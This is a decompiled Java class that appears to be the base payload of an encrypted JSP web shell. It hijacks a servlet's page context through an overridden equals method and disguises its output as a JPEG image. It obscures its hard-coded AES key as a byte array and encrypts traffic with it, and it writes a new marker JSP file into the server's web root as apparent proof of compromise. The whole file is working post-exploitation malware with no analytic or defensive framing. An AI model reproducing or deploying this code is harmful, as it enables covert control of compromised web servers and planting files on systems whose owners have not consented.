package util;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.util.Date;
import java.util.zip.Deflater;

public class BaseX3 implements Serializable {
   public transient PageContext pc;
   public transient HttpServletRequest r;
   public transient HttpServletResponse rp;
   public transient OutputStream o;
   public transient HttpSession ss;
   public String szPn = "X3_verify_mIjyqEnm7D1D_tyJ0FN3rw.jsp";
   public String key = new String(new byte[]{37, 84, 74, 72, 71, 60, 62, 63, 90, 45, 41, 57, 56, 38, 94, 53});

   public String Encrypt(String var1) {
      try {
         String var2 = this.key;
         byte[] var3 = var2.getBytes("utf-8");
         Cipher var4 = Cipher.getInstance("AES/CBC/NoPadding");
         int var5 = var4.getBlockSize();
         byte[] var6 = var1.getBytes();
         int var7 = var6.length;
         if (var7 % var5 != 0) {
            var7 += var5 - var7 % var5;
         }

         byte[] var8 = new byte[var7];
         System.arraycopy(var6, 0, var8, 0, var6.length);
         SecretKeySpec var9 = new SecretKeySpec(this.key.getBytes(), "AES");
         IvParameterSpec var10 = new IvParameterSpec(var3);
         var4.init(1, var9, var10);
         byte[] var11 = var4.doFinal(var8);
         return DatatypeConverter.printBase64Binary(var11);
      } catch (Exception var12) {
         this.log(var12);
         return null;
      }
   }

   public String Decrypt(String var1) {
      try {
         return new String(this.Decrypt4Bytes(var1), "utf-8");
      } catch (Exception var3) {
         this.log(var3);
         return null;
      }
   }

   public void log(Exception var1) {
      if (this.o != null && var1 != null) {
         var1.printStackTrace(new PrintStream(this.o));
      }

   }

   public byte[] Decrypt4Bytes(String var1) {
      try {
         String var2 = this.key;
         byte[] var3 = var2.getBytes("utf-8");
         SecretKeySpec var4 = new SecretKeySpec(var3, "AES");
         Cipher var5 = Cipher.getInstance("AES/CFB8/NoPadding");
         IvParameterSpec var6 = new IvParameterSpec(var3);
         var5.init(2, var4, var6);
         byte[] var7 = DatatypeConverter.parseBase64Binary(var1);
         byte[] var8 = var5.doFinal(var7);
         return var8;
      } catch (Exception var9) {
         this.log(var9);
         return null;
      }
   }

   public void print(String var1) {
      if (this.o != null && var1 != null) {
         this.print(var1.getBytes());
      }

   }

   public void print(byte[] var1) {
      try {
         if (this.o != null && var1 != null) {
            this.o.write(var1);
         }
      } catch (Exception var3) {
      }

   }

   public boolean c() throws Exception {
      return false;
   }

   private void createMyId() {
      try {
         String var1 = this.pc.getServletContext().getRealPath(this.r.getRequestURI());
         var1 = var1 + File.pathSeparator + this.szPn;
         FileOutputStream var2 = new FileOutputStream(var1);
         var2.write(("<%=\"i am butian mIjyqEnm7D1D+tyJ0FN3rw " + (new Date()).toGMTString() + "\"%>").getBytes());
         var2.close();
      } catch (Exception var3) {
         this.log(var3);
      }

   }

   public BaseX3() {
   }

   public boolean equals(Object var1) {
      Object var2 = null;
      if (var1 instanceof PageContext) {
         try {
            this.pc = (PageContext)var1;
            this.r = (HttpServletRequest)this.pc.getRequest();
            this.rp = (HttpServletResponse)this.pc.getResponse();
            this.o = this.rp.getOutputStream();
            this.ss = this.r.getSession(false);
            if (this.ss == null) {
               this.ss = this.r.getSession(true);
            }

            this.rp.reset();
            this.rp.setContentType("image/jpeg");
            this.c();
            this.createMyId();
         } catch (Exception var16) {
            this.log(var16);
         } finally {
            if (this.o != null) {
               try {
                  this.o.flush();
               } catch (Throwable var15) {
               }

               try {
                  this.o.close();
               } catch (Throwable var14) {
               }
            }

            if (var2 != null) {
               ((Deflater)var2).end();
            }

         }
      }

      return false;
   }
}
